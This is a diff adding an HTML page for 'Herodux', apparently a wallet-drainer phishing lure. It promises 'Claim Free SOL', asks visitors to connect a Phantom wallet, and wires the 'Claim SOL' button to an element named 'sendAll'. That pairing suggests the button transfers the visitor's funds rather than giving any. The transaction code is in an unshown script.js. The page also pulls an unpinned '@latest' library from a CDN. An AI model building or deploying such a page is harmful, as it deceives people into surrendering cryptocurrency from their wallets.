@@ -1,0 +1,19 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Herodux - Claim Free SOL (Demo)</title>
+<link rel="stylesheet" href="style.css">
+<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+</head>
+<body>
+<div class="container">
+    <h1>Claim Free SOL!</h1>
+    <p>Connect your Phantom wallet to see your balance and claim SOL (Demo).</p>
+    <button id="connectWallet">Connect Phantom Wallet</button>
+    <button id="sendAll">Claim SOL</button>
+    <p id="status"></p>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
